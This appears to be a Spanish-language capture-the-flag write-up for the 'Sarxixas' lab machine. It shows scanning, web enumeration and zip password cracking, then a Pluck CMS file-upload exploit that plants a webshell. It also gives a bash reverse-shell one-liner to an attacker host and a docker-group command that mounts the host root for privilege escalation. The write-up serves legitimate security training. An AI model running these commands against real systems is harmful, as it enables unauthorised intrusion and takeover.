# 🎯 Sarxixas - The Hackers Labs

![Difficulty: Medium](https://img.shields.io/badge/Difficulty-Medium-orange) ![Platform: The Hackers Labs](https://img.shields.io/badge/Platform-The%20Hackers%20Labs-blue) ![OS: Linux](https://img.shields.io/badge/OS-Linux-red)

## 📌 **Descripción General**
**Sarxixas** es una máquina virtual diseñada para el aprendizaje y práctica de técnicas de **pentesting** en entornos Linux. La máquina explota vulnerabilidades comunes como **RCE en Pluck CMS**, **cracking de archivos ZIP**, **escalada de privilegios mediante Docker** y **movimiento lateral**.

🔹 **Plataforma:** [The Hackers Labs](https://thehackerslabs.com)
🔹 **Sistema Operativo:** Linux (Debian)
🔹 **Dificultad:** Media-Alta

---

## 🏷️ **Etiquetas**
`Linux` | `Pluck CMS` | `RCE` | `Zip Cracking` | `John the Ripper` | `Base58` | `Docker` | `Group Permission`

---

## 🛠️ **Instalación**
1. **Descargar la OVA:**
   - Obtener el archivo `.zip` que contiene la máquina virtual desde [The Hackers Labs](https://thehackerslabs.com).
   - Extraer el contenido.

2. **Importar en VirtualBox:**
   - Abrir **VirtualBox** y seleccionar `Archivo > Importar servicio...`.
   - Elegir la OVA extraída y configurar la máquina virtual.

3. **Configurar la red:**
   - Asegurarse de que la máquina atacante (Kali Linux) y la víctima (Sarxixas) estén en la misma red.
   - Configurar la interfaz de red de Sarxixas en modo **NAT** o **Host-Only** según la topología deseada.

4. **Iniciar la máquina:**
   - Encender ambas máquinas y verificar la conectividad con `ping`.

---

## 1. Inicialización del Entorno

```bash
ctf-init sarxixas
[+] Entorno CTF creado en /home/predator/Escritorio/sarxixas
```

Estructura creada:
- `exploit/`
- `files/`
- `notes/`
- `post/`
- `recon/`

---

## 2. Reconocimiento de Red

cd recon

░▒▓    ~/Escritorio  ✔ ▓▒░ ctf-init sarxixas
[+] Entorno CTF creado en /home/predator/Escritorio/sarxixas
 exploit   files   notes   post   recon

░▒▓    ~/Escritorio/sarxixas  ✔ ▓▒░ cd recon          

```bash
░▒▓    ~/Escritorio/sarxixas/recon  ✔ ▓▒░ recon 192.168                                       
[sudo] contraseña para predator: 
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-25 18:28 -0500
Initiating ARP Ping Scan at 18:28
Scanning 192.168 [1 port]
Completed ARP Ping Scan at 18:28, 0.11s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 18:28
Scanning 192.168 [65535 ports]
Discovered open port 80/tcp on 192.168
Discovered open port 22/tcp on 192.168
Completed SYN Stealth Scan at 18:28, 0.90s elapsed (65535 total ports)
Nmap scan report for 192.168
Host is up, received arp-response (0.00028s latency).
Scanned at 2026-06-25 18:28:23 -05 for 1s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: 08:00:27:5D:9D:17 (Oracle VirtualBox virtual NIC)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 1.26 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
```

---


░▒▓    ~/Escritorio/sarxixas/recon  ✔  took  4s ▓▒░ ls
 allPorts
```bash
░▒▓    ~/Escritorio/sarxixas/recon  ✔ ▓▒░ extractPorts allPorts              


[*] Extracting information...

        [*] IP Address: 192.168
        [*] Open ports: 22,80

[*] Ports copied to clipboard
```

```

░▒▓    ~/Escritorio/sarxixas/recon  ✔ ▓▒░ enum 22,80 192.168
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-25 18:29 -0500
Nmap scan report for 192.168
Host is up (0.00035s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 9c:e0:78:67:d7:63:23:da:f5:e3:8a:77:00:60:6e:76 (ECDSA)
|_  256 4b:30:12:97:4b:5c:47:11:3c:aa:0b:68:0e:b2:01:1b (ED25519)
80/tcp open  http    Apache httpd 2.4.57 ((Debian))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-robots.txt: 2 disallowed entries 
|_/data/ /docs/
|_http-generator: pluck 4.7.13
| http-title: sarxixas - sarxixas
|_Requested resource was http://192.168/?file=sarxixas
MAC Address: 08:00:27:5D:9D:17 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.93 seconds
```

# Se añadió el dominio sarxixas.thl apuntando a 192.168

```bash
░▒▓    ~/Escritorio/sarxixas/recon  ✔  took  8s ▓▒░ sudo nano /etc/hosts                                           

```
# Identificación de Tecnologias

░▒▓    ~/Escritorio/sarxixas/recon  ✘ 1 ▓▒░ whatweb http://192.168/              
http://192.168/ [302 Found] Apache[2.4.57], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTTPServer[Debian Linux][Apache/2.4.57 (Debian)], IP[192.168], RedirectLocation[http://192.168/?file=sarxixas]
http://192.168/?file=sarxixas [200 OK] Apache[2.4.57], Country[RESERVED][ZZ], HTTPServer[Debian Linux][Apache/2.4.57 (Debian)], IP[192.168, MetaGenerator[pluck 4.7.13], Pluck-CMS[4.7.13], Title[sarxixas - sarxixas]

# Enumeración Web
░▒▓    ~/Escritorio/sarxixas/recon  ✘ 1 ▓▒░ web http://192.168./               
[+]===================================================[+]
      AUDITORÍA WEB AUTOMATIZADA CON MULTI-GOBUSTER                                                                                                                                                                                         
[+]===================================================[+]                                                                                                                                                                                   

[?] Introduce la I>/dev/null 2>&1 &P o Dominio del objetivo (ej. 57.128.254.142): http://192.168/?file=sarxixas 

[*] Objetivo fijado: http://192.168/?file=sarxixas
[*] Los resultados se guardarán en: ./gobuster_scans/                                                                                                                                                                                       

[--->] Iniciando escaneo con: /usr/share/wordlists/dirb/common.txt ...
.hta.php             (Status: 403) [Size: 278]
.hta                 (Status: 403) [Size: 278]
.hta.json            (Status: 403) [Size: 278]
.hta.api             (Status: 403) [Size: 278]
.hta.html            (Status: 403) [Size: 278]
.hta.txt             (Status: 403) [Size: 278]
.hta.bak             (Status: 403) [Size: 278]
.htaccess            (Status: 403) [Size: 278]
.htaccess.bak        (Status: 403) [Size: 278]
.htaccess.txt        (Status: 403) [Size: 278]
.htaccess.php        (Status: 403) [Size: 278]
.htaccess.html       (Status: 403) [Size: 278]
.htpasswd            (Status: 403) [Size: 278]
.htpasswd.php        (Status: 403) [Size: 278]
.htpasswd.html       (Status: 403) [Size: 278]
.htpasswd.json       (Status: 403) [Size: 278]
.htpasswd.api        (Status: 403) [Size: 278]
.htpasswd.txt        (Status: 403) [Size: 278]
.htpasswd.bak        (Status: 403) [Size: 278]
.htaccess.api        (Status: 403) [Size: 278]
.htaccess.json       (Status: 403) [Size: 278]
admin.php            (Status: 200) [Size: 3758]
admin.php            (Status: 200) [Size: 3758]
api                  (Status: 301) [Size: 326] [--> http://192.168/api/?file=sarxixas]
data                 (Status: 301) [Size: 327] [--> http://192.168/data/?file=sarxixas]
docs                 (Status: 301) [Size: 327] [--> http://192.168/docs/?file=sarxixas]
files                (Status: 301) [Size: 328] [--> http://192.168/files/?file=sarxixas]
images               (Status: 301) [Size: 329] [--> http://192.168./images/?file=sarxixas]
index.php            (Status: 200) [Size: 974]
index.php            (Status: 200) [Size: 974]
login.php            (Status: 200) [Size: 1247]
robots.txt           (Status: 200) [Size: 47]
robots.txt           (Status: 200) [Size: 47]
server-status        (Status: 403) [Size: 278]
[✓] Completado. Resultados guardados en: gobuster_scans/scan_common.txt

server-status        (Status: 403) [Size: 278]
[✓] Completado. Resultados guardados en: gobuster_scans/scan_directory-list-2.3-medium.txt

[!] Saltando diccionario (No encontrado): /usr/share/wordlists/seclists/Discovery/Web-Content/api-endpoints.txt

[+] Proceso terminado con éxito.

** Importante el directorio api/**

# fuzzeamos un poco para confirmar el resultado de las rutas

```bash
░▒▓    ~/Escritorio/sarxixas/recon  ✔ ▓▒░ wfuzz -c --hh=404 -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -u "http://sarxixas.thl" -H "Host: FUZZ.sarxixas.thl" --hw=0
```
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://sarxixas.thl/
Total requests: 220559

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                                                    
=====================================================================

000000001:   400        10 L     35 W       301 Ch      "# directory-list-2.3-medium.txt"                                                                                                                                          
000000007:   400        10 L     35 W       301 Ch      "# license, visit http://creativecommons.org/licenses/by-sa/3.0/"                                                                                                          
000000003:   400        10 L     35 W       301 Ch      "# Copyright 2007 James Fisher"                                                                                                                                            
000000013:   400        10 L     35 W       301 Ch      "#"                                                                                                                                                                        
000000010:   400        10 L     35 W       301 Ch      "#"                                                                                                                                                                        
000000009:   400        10 L     35 W       301 Ch      "# Suite 300, San Francisco, California, 94105, USA."                                                                                                                      
000000011:   400        10 L     35 W       301 Ch      "# Priority ordered case-sensitive list, where entries were found"                                                                                                         
000000006:   400        10 L     35 W       301 Ch      "# Attribution-Share Alike 3.0 License. To view a copy of this"                                                                                                            
000000012:   400        10 L     35 W       301 Ch      "# on at least 2 different hosts"                                                                                                                                          
000000008:   400        10 L     35 W       301 Ch      "# or send a letter to Creative Commons, 171 Second Street,"                                                                                                               
000000005:   400        10 L     35 W       301 Ch      "# This work is licensed under the Creative Commons"                                                                                                                       
000000002:   400        10 L     35 W       301 Ch      "#"                                                                                                                                                                        
000000004:   400        10 L     35 W       301 Ch      "#"                                                                                                                                                                        
000001026:   200        15 L     51 W       776 Ch      "api"                                                                                                                                                                      
000002024:   400        10 L     35 W       301 Ch      "'"                                                                                                                                                                        
000003790:   400        10 L     35 W       301 Ch      "%20"                                                                                                                                                                      
000005302:   400        10 L     35 W       301 Ch      "$FILE"                                                                                                                                                                    
000005954:   400        10 L     35 W       301 Ch      "$file"                                                                                                                                                                    
000007004:   400        10 L     35 W       301 Ch      "*checkout*"                                                                                                                                                               
000012688:   200        15 L     51 W       776 Ch      "API"                                                                                                                                                                      
000015463:   400        10 L     35 W       301 Ch      "*docroot*"                                                                                                                                                                
000016413:   400        10 L     35 W       301 Ch      "*"                                                                                                                                                                        
000017001:   400        10 L     35 W       301 Ch      "$File"                                                                                                                                                                    
000018292:   400        10 L     35 W       301 Ch      "!ut"                                                                                                                                                                      
000020266:   400        10 L     35 W       301 Ch      "search!default"                                                                                                                                                           
000020311:   400        10 L     35 W       301 Ch      "video games"                                                                                                                                                              
000020353:   400        10 L     35 W       301 Ch      "msgReader$1"                                                                                                                                                              
000021357:   400        10 L     35 W       301 Ch      "spyware doctor"                                                                                                                                                           
000021365:   400        10 L     35 W       301 Ch      "4%20Color%2099%20IT2"                                                                                                                                                     
000021893:   400        10 L     35 W       301 Ch      "nero 7"                                                                                                                                                                   
000022055:   400        10 L     35 W       301 Ch      "%7Emike"                                                                                                                                                                  
000022550:   400        10 L     35 W       301 Ch      "long distance"                     
<img width="1920" height="967" alt="login" src="https://github.com/user-attachments/assets/70d2d95e-9566-4053-93a4-8f05fcb16769" />


# Búsqueda de Exploits
 searchsploit -w pluck 4.7.13     
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------------------
 Exploit Title                                                                                                                                                                                 |  URL
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------------------
Pluck CMS 4.7.13 - File Upload Remote Code Execution (Authenticated)                                                                                                                           | https://www.exploit-db.com/exploits/49909
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------------------
Shellcodes: No Results
<img width="1920" height="1001" alt="lookfor" src="https://github.com/user-attachments/assets/d03b0010-af8c-43d4-a523-cf706a811dfc" />

### NOs ubicamos en el directorio API
descargamos el zip HostiaPilotes.zip

░▒▓    ~/Escritorio/sarxixas  ✔ ▓▒░ cd files

░▒▓    ~/Escritorio/sarxixas/files  ✔ ▓▒░ ls
 HostiaPilotes.zip
<img width="1920" height="1003" alt="api" src="https://github.com/user-attachments/assets/d1368c27-a6f6-46e9-82d8-cc998419449f" />

** IMPORTANTE **
el zip esta con contraseña y primero creamos un hash para usarlo con john
░▒▓    ~/Escritorio/sarxixas/files  ✔ ▓▒░ zip2john HostiaPilotes.zip > hash
ver 1.0 HostiaPilotes.zip/HostiaPilotes/ is not encrypted, or stored with non-handled compression type
ver 1.0 efh 5455 efh 7875 HostiaPilotes.zip/HostiaPilotes/contraseña.txt PKZIP Encr: 2b chk, TS_chk, cmplen=31, decmplen=19, crc=DF1DBE40 ts=69C0 cs=69c0 type=0

░▒▓    ~/Escritorio/sarxixas/files  ✔ ▓▒░ ls
 hash   HostiaPilotes   HostiaPilotes.zip

░▒▓    ~/Escritorio/sarxixas/files  ✔ ▓▒░ john --wordlist=/usr/share/wordlists/rockyou.txt hash                                                                                               
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press Ctrl-C to abort, or send SIGUSR1 to john process for status
babybaby         (HostiaPilotes.zip/HostiaPilotes/contraseña.txt)     
1g 0:00:00:00 DONE (2026-06-25 19:01) 1.851g/s 15170p/s 15170c/s 15170C/s 123456..whitetiger
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
<img width="1920" height="1080" alt="hash" src="https://github.com/user-attachments/assets/754aaf25-d660-4c21-9c2d-da8e5093bee9" />

# Explotacion 

cd exploit

░▒▓    ~/Escritorio/sarxixas/exploit  ✔ ▓▒░ nano exploit.py                 

░▒▓    ~/Escritorio/sarxixas/exploit  ✔  took  4s ▓▒░ python exploit.py 192.168 80 ElAbueloDeLaAnitta
Traceback (most recent call last):
  File "/home/predator/Escritorio/sarxixas/exploit/exploit.py", line 34, in <module>
    pluckcmspath = sys.argv[4]
                   ~~~~~~~~^^^
IndexError: list index out of range

░▒▓    ~/Escritorio/sarxixas/exploit  ✘ 1 ▓▒░ python exploit.py 192.168 80 ElAbueloDeLaAnitta /

Authentification was succesfull, uploading webshell

Uploaded Webshell to: http://192.168:80//files/shell.phar

<img width="1920" height="970" alt="shell" src="https://github.com/user-attachments/assets/f1ec1bc8-070e-4762-8bb5-1aea43e2834f" />


Ejecutamos  en la webshell y nos ponemos en escucha con nc -p 443

p0wny@shell:â¦/www/html# bash -c "bash -i >& /dev/tcp/ip atacante/443 0>&1"

tratamos la tty
www-data@sarxixas:/var/www/html$ export SHELL=bash  
www-data@sarxixas:/var/www/html$ export TERM=xterm-256color  
www-data@sarxixas:/var/www/html$ source /etc/skel/.bashrc    
www-data@sarxixas:/var/www/html$

# Crackeo zip
www-data@sarxixas:/$ ls /opt/

(Penelope)─(Session [1])> download /opt/edropedropedrooo.zip

fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt edropedropedrooo.zip      
                                                                                                                                                
unzip edropedropedrooo.zip    
Archive:  edropedropedrooo.zip  
[edropedropedrooo.zip] pedropedropedrooo.txt password:    
extracting: pedropedropedrooo.txt      
                                                                                                                                                
cat pedropedropedrooo.txt          
3HBRD7XyxF5gAbkMmnWdW

codificado en base58, y traduce a Quepasaolvidona%. 

para usarlo es cambiar introduciendo "uepasaolvidona"
<img width="1920" height="1001" alt="base58" src="https://github.com/user-attachments/assets/3d8897a2-a090-4921-93a8-77a764f49ef6" />

www-data@sarxixas:/var/www/html/files$ su sarxixa  
Password:    
sarxixa@sarxixas:/var/www/html/files$

En este paso, es sencillo vamos a escalar privilegios
me da pereza explicar pero basicamente es que hay un contenedor docker en la raiz fin.

con esto se explota:
```bash
docker run -v /:/host -it alpine chroot /host bash ; cat /home/sarxixa/user.txt /root/root.txt    
root@81c4066f355d:/# 
**********************  
**********************
```
<img width="1920" height="1080" alt="root" src="https://github.com/user-attachments/assets/5421ab17-46b2-4fe1-bcd8-b15ac1ed1015" />







